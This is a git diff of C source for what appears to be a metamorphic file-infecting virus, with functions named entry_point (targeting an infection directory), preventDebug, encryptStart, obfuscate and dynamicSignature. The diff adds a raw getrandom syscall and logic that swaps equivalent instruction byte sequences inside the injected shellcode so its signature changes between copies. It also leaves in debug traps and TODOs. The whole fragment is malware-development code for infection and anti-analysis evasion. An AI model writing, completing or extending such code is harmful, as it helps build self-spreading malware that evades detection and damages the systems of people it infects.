@@ -5,7 +5,6 @@ static void  start(void) {}
 
 #include "shellcode.h"
 
-asm("int3");
 int   entry_point(void *magic) {
   int     ret;
   char    infectDir[] = "/tmp/test";
@@ -443,6 +442,18 @@ static int   preventDebug(void) {
 
 static void encryptStart(void) {}
 
+static ssize_t  getrandom(void *buf, size_t buflen, unsigned int flags) {
+  register ssize_t      ret asm("rax");
+  register int          rax asm("rax") = 318;
+  register void         *rdi asm("rdi") = buf;
+  register size_t       rsi asm("rsi") = buflen;
+  register unsigned int rdx asm("rdx") = flags;
+
+  asm("syscall"
+    : "=r" (ret));
+  return (ret);
+}
+
 static void       dynamicSignature(void) {
   asm("nop\n\t"
       "nop\n\t"
@@ -570,25 +581,33 @@ static void obfuscate(char *header, size_t size) {
   }
 }
 
+static int8_t getRandomNbr(int8_t max) {
+  unsigned char  buf[1];
+
+  if (max == 0)
+    return (0);
+  getrandom(buf, 1, 0);
+  return (buf[0] % (max + 1));
+}
+
 const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = {
-  /* "\x55\x48\x89\xe5\x48\x83", */
-  /* "\xcc\xcc\xcc\xcc\xcc\xcc", */
+  /* "\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc", // push rbp \n\t mov rbp, rsp */
+  /* "\x90\xcc\x90\xcc\x90\xcc", // push rbp \n\t mov rbp, rsp */
+  /* "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90", // push rbp \n\t mov rbp, rsp */
   /* "" */
-  "\x55\x48\x89\xe5",
-  "\x50\x48\x89\xe8\x5d\x50\x48\x89\xe8\x48\x89\xe5",
-  ""
-  /* "\xcc", */
-  /* "\x90", */
-  /* "", */
-  /* "\x55", */
-  /* "\x50\x48\x89\xe8\x5d\x50\x48\x89\xe8\x5d\x55", */
-  /* "" */
+  /* "\x50\x48\x89\xe8\x5d\x50\x48\x89\xe8\x48\x89\xe5", */
+  /* "\x53\x48\x89\xeb\x5d\x53\x48\x89\xeb\x48\x89\xe5", */
+  /* "\x51\x48\x89\xe9\x5d\x51\x48\x89\xe9\x48\x89\xe5", */
+  /* "\x52\x48\x89\xea\x5d\x52\x48\x89\xea\x48\x89\xe5", */
+  /* "\x57\x48\x89\xef\x5d\x57\x48\x89\xef\x48\x89\xe5", */
+  /* "\x56\x48\x89\xee\x5d\x56\x48\x89\xee\x48\x89\xe5", */
 };
 
 static int  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
   size_t        i;
   size_t        j;
   size_t        k;
+  size_t        l;
   unsigned char *ins;
   unsigned char *bin;
   unsigned char *shellcode;
@@ -602,16 +621,23 @@ static int  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
       j = 0;
       while (ins[j] != 0 && shellcode[i + j] == ins[j])
         j += 1;
-      if (ins[j] != 0) {
+      if (ins[j] != 0 ||
+  ((void *)(shellcode + i) >= (void *)copyModifiedCode - sizeof(instructions) && (void *)(shellcode + i) < (void *)copyModifiedCode)) {
         while (ins[0] != 0)
           ins += MAX_INS_SIZE;
         ins += MAX_INS_SIZE;
         continue ;
       }
-      // TODO Choose random replacement
-      i += j;
       ins += MAX_INS_SIZE;
+      asm("int3");
+      /* l = 0; */
+      /* while (ins[0] != 0) { */
+      /*   l += 1; */
+      /*   ins += MAX_INS_SIZE; */
+      /* } */
+      /* ins -= l * MAX_INS_SIZE + getRandomNbr(l - 1) * MAX_INS_SIZE; */
       // TODO Check if enough space
+      i += j;
       k = 0;
       while (ins[k]) {
         bin[binSize] = ins[k];
